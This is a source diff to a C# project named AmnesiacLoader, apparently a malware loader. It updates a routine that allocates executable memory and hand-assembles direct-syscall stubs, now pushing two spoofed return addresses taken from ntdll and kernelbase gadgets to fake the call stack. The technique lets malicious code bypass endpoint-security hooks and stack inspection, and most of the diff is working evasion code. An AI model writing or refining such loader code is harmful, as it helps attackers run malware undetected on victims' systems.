@@ -122,43 +122,48 @@ namespace AmnesiacLoader
         //   add rsp, 8           (4B) — clean up fake frame slot
         //   ret                  (1B)
 
-        internal static IntPtr AllocateStub(ushort ssn, IntPtr gadget)
+        internal static IntPtr AllocateStub(ushort ssn, IntPtr ntdllGadget, IntPtr kbaseGadget)
         {
             IntPtr mem = VirtualAlloc(IntPtr.Zero, (UIntPtr)64, MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE);
-            if (mem == IntPtr.Zero)
-                throw new InvalidOperationException("VirtualAlloc failed for syscall stub");
+            if (mem == IntPtr.Zero) throw new InvalidOperationException("VirtualAlloc failed for syscall stub");
 
             unsafe
             {
                 byte* p = (byte*)mem.ToPointer();
                 int   i = 0;
 
-                // sub rsp, 8
-                p[i++]=0x48; p[i++]=0x83; p[i++]=0xEC; p[i++]=0x08;
+                // sub rsp, 16  (4 bytes)
+                p[i++]=0x48; p[i++]=0x83; p[i++]=0xEC; p[i++]=0x10;
 
-                // mov rax, <gadget64>  (REX.W B8 + 8-byte immediate)
+                // mov rax, kbaseGadget  (10 bytes) — outermost frame
                 p[i++]=0x48; p[i++]=0xB8;
-                long g = gadget.ToInt64();
-                for (int b = 0; b < 8; b++) { p[i++] = (byte)(g & 0xFF); g >>= 8; }
+                long kg = kbaseGadget.ToInt64();
+                for (int b = 0; b < 8; b++) { p[i++] = (byte)(kg & 0xFF); kg >>= 8; }
 
-                // mov [rsp], rax
+                // mov [rsp+8], rax  (5 bytes)
+                p[i++]=0x48; p[i++]=0x89; p[i++]=0x44; p[i++]=0x24; p[i++]=0x08;
+
+                // mov rax, ntdllGadget  (10 bytes) — innermost frame
+                p[i++]=0x48; p[i++]=0xB8;
+                long ng = ntdllGadget.ToInt64();
+                for (int b = 0; b < 8; b++) { p[i++] = (byte)(ng & 0xFF); ng >>= 8; }
+
+                // mov [rsp], rax  (4 bytes)
                 p[i++]=0x48; p[i++]=0x89; p[i++]=0x04; p[i++]=0x24;
 
-                // mov r10, rcx
+                // mov r10, rcx  (3 bytes)
                 p[i++]=0x4C; p[i++]=0x8B; p[i++]=0xD1;
 
-                // mov eax, ssn
-                p[i++]=0xB8;
-                p[i++]=(byte)(ssn & 0xFF); p[i++]=(byte)(ssn >> 8);
-                p[i++]=0x00; p[i++]=0x00;
+                // mov eax, ssn  (5 bytes)
+                p[i++]=0xB8; p[i++]=(byte)(ssn&0xFF); p[i++]=(byte)(ssn>>8); p[i++]=0x00; p[i++]=0x00;
 
-                // syscall
+                // syscall  (2 bytes)
                 p[i++]=0x0F; p[i++]=0x05;
 
-                // add rsp, 8
-                p[i++]=0x48; p[i++]=0x83; p[i++]=0xC4; p[i++]=0x08;
+                // add rsp, 16  (4 bytes)
+                p[i++]=0x48; p[i++]=0x83; p[i++]=0xC4; p[i++]=0x10;
 
-                // ret
+                // ret  (1 byte)
                 p[i++]=0xC3;
             }
             return mem;
@@ -253,11 +258,11 @@ namespace AmnesiacLoader
             IntPtr stub;
             if (!_stubs.TryGetValue(name, out stub))
             {
-                ushort ssn = Resolve(name);
-                if (ssn == 0xFFFF)
-                    throw new InvalidOperationException("Could not resolve SSN for: " + name);
-                IntPtr gadget = CallStack.GetGadget();
-                stub = AllocateStub(ssn, gadget);
+                ushort ssn         = Resolve(name);
+                if (ssn == 0xFFFF) throw new InvalidOperationException("Could not resolve SSN for: " + name);
+                IntPtr ntdllGadget = CallStack.GetGadget();
+                IntPtr kbaseGadget = CallStack.GetKernelbaseGadget();
+                stub = AllocateStub(ssn, ntdllGadget, kbaseGadget);
                 _stubs[name] = stub;
             }
             return Marshal.GetDelegateForFunctionPointer(stub, typeof(T)) as T;
